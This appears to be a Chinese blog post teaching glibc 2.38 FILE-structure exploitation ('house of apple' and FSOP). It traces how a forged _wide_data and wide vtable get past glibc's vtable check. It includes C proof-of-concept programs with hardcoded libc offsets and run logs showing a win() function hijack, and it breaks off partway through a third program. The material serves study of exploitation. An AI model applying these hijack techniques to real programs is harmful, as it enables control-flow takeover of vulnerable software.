<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread</span><br><span class="line">	_IO_sgetn</span><br><span class="line">		_IO_XSGETN</span><br><span class="line">			JUMP2</span><br><span class="line">				_IO_JUMPS_FUNC</span><br><span class="line">=&gt;					IO_validate_vtable </span><br><span class="line">						_IO_JUMPS_FILE_plus</span><br></pre></td></tr></table></figure>

<p><code>IO_validate_vtable</code>是必然被调用的,检查的是<code>_IO_FILE_plus.vtable</code></p>
<p>然而在<code>_IO_XSGETN</code>宏定义这里还有一个兄弟叫<code>_IO_WXSGETN</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.38/libio/libioP.h:184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>

<p>这个兄弟宏定义展开发现是没有<code>_IO_validate_vtable</code>这种检查的,会直接调用到<code>_IO_FILE._wide_data-&gt;_wide_vtable</code>中的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_WXSGETN</span><br><span class="line">	WJUMP2</span><br><span class="line">		_IO_WIDE_JUMPS_FUNC</span><br><span class="line">			_IO_WIDE_JUMPS</span><br><span class="line">				_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span><br></pre></td></tr></table></figure>

<p>也就是说劫持<code>_wide_vtable</code>虚表指针是不会被检查的</p>
<p>而<code>_wide_data</code>结构体位于<code>libc</code>的只读内存区中,无法修改其中的<code>_wide_vtable</code>,因此还需要伪造一个<code>_wide_data</code></p>
<p>并且只劫持<code>_wide_vtable</code>还不够,因为正常情况下控制流是绝对不会进入任何一个宽字节相关函数的</p>
<p>所以还需要把<code>_IO_FILE_plus.vtable</code>改成<code>IO_WFILE_JUMPS</code></p>
<p>最后再调用一个<code>fwrite</code></p>
<p>接下来控制流是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	=&gt; vtable+0x38</span><br><span class="line">		=&gt; _IO_wfile_xsputn</span><br><span class="line">			=&gt; _IO_wdefault_xsputn @ glibc/libio/wgenops.c</span><br><span class="line">				=&gt; __woverflow</span><br><span class="line">					=&gt; vtable+0x18</span><br><span class="line">						=&gt; _IO_wfile_overflow</span><br><span class="line">							=&gt; _IO_wdoallocbuf</span><br><span class="line">								=&gt; _IO_WDOALLOCATE (wide_data.wide_vtable+0x68 =&gt; win )</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<p>总的来说,需要干这么几步:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span><br><span class="line">1.构造fake_wide_vtable,在其中填充目标函数(关键是+0x68位置)</span><br><span class="line">2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针吗,指向1中构造的fake_wide_vtable</span><br><span class="line">3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) // ~(0x800 | 0x8 | 0x2)</span><br><span class="line">4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span><br><span class="line">5.修改FILE._wide_data指向2中构造的fake_wide_data</span><br><span class="line">6.fwrite触发house of apple</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里复位了三个<code>flag</code>,各自的作用是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>		<span class="comment">//2.必须有写权限</span></span><br><span class="line"> &#123;</span><br><span class="line">   f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">   __set_errno (EBADF);</span><br><span class="line">   <span class="keyword">return</span> WEOF;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>		<span class="comment">//1.不能是_IO_CURRENTLY_PUTTING,这样就会进入本if从而调用到_IO_wdoallocbuf</span></span><br><span class="line">   || f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">   <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))		<span class="comment">//_IO_UNBUFFERED必须等于0才会进入本if,调用到_IO_WDOALLOCATE</span></span><br><span class="line"> <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>写个poc意思意思</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">100</span>,fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基于<code>glibc2.38</code>做实验,<code>win</code>函数被调用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc apple.c -o apple -g -no-pie -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./apple</span><br><span class="line">function printf @ 0x7f7e72eba110</span><br><span class="line">_IO_wfile_jumps @ 0x7f7e7303b268</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>







<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>上集说到,<code>house of apple</code>在构造好了<code>FILE</code>之后,还要对其进行一个<code>fwrite</code>等操作触发到<code>_IO_wfile_overflow</code>函数</p>
<p>在本集中,<strong>不需要</strong>调用<code>fwrite</code>等操作,也可以触发,相关攻击方式叫做<code>FSOP(File Structure Oriented Programming)</code></p>
<p>程序退出时,会有这么一条调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + 0x18 =&gt; _IO_file_overflow</span><br></pre></td></tr></table></figure>

<p>这个<code>_IO_flush_all</code>中会把<code>_IO_list_all</code>上挂着的都尝试一下<code>_IO_OVERFLOW</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     run_fp = fp;</span><br><span class="line">     _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">     _IO_funlockfile (fp);</span><br><span class="line">     run_fp = <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里能够执行<code>_IO_OVERFLOW</code>的条件是下式为真</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">|| </span><br><span class="line">(</span><br><span class="line">    _IO_vtable_offset(fp) == <span class="number">0</span> </span><br><span class="line">    &amp;&amp;</span><br><span class="line">    fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">    &amp;&amp; </span><br><span class="line">    (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>翻译成人话就是下面两条<strong>有一条为真</strong>即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.如果fp-&gt;_mode&lt;=0,还需要满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">2.如果fp-&gt;_mode&gt; 0,还需要满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>



<p>如果能够使用<code>house of apple</code>的方法,</p>
<p><strong>使得的<code>vtable</code>指向<code>_IO_wfile_jumps</code>,然后构造<code>wide_data</code>,并使其<code>wide_vtable</code>指向假的虚表,假表相应位置填充<code>win</code>函数地址</strong></p>
<p><strong>然后将这个FILE挂到<code>_IO_list_all</code>链上</strong></p>
<p>就可以调用到<code>win</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + <span class="number">0x18</span> =&gt; _IO_wfile_overflow</span><br><span class="line">						_IO_wdoallocbuf</span><br><span class="line">							_IO_WDOALLOCATE</span><br><span class="line">    							wide_data.wide_vtable  + <span class="number">0x68</span> =&gt; win</span><br></pre></td></tr></table></figure>

<p>写一个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fake_fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="comment">//泄露libc基址,泄露IO_wfile_jumps地址,泄露IO_list_all地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_list_all_addr = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d74c0</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_list_all_addr = %p\n&quot;</span>, IO_list_all_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.</span></span><br><span class="line">    <span class="comment">//构造fake_fp</span></span><br><span class="line">    fake_fp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_fp,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    fake_fp -&gt; _flags =  ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>); </span><br><span class="line">    fake_fp -&gt; _mode = <span class="number">0</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_fp @ %p\n&quot;</span>, fake_fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orignal _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//5.fake_fp上链_IO_list_all</span></span><br><span class="line">    *IO_list_all_addr = fake_fp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.</span></span><br><span class="line">    <span class="comment">//return and trigger win</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop1.c -o fsop1 -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop1</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7fb0bbddc110</span><br><span class="line">libc_addr = 0x7fb0bbd88000</span><br><span class="line">IO_list_all_addr = 0x7fb0bbf5f4c0</span><br><span class="line">IO_wfile_jumps = 0x7fb0bbf5d268</span><br><span class="line">fake_fp @ 0x55fbae0cc8d0</span><br><span class="line">orignal _IO_list_all points to 0x7fb0bbf5f4e0</span><br><span class="line">new _IO_list_all points to 0x55fbae0cc8d0</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>



<p>如果能够控制<code>fopen</code>并且不<code>fclose</code>关闭资源则更简单,</p>
<p><code>fopen</code>会自动让假<code>fp</code>上链,</p>
<p>不<code>fclose</code>的话<code>fp</code>就不会下链,</p>
<p>因此此时程序退出,也可以触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    